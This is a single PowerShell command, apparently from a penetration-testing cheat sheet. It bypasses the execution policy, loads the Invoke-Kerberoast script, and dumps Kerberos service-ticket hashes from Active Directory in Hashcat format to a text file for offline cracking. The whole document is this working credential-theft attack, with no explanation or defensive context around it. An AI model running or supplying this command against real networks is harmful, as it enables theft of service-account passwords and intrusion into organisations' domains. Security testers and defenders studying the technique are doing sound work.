powershell -ep bypass -c ". C:\Tools\Invoke-Kerberoast.ps1 ; Invoke-Kerberoast -OutputFormat HashCat | Select-Object -ExpandProperty hash | Out-File -Encoding ASCII kerb-Hash1.txt"
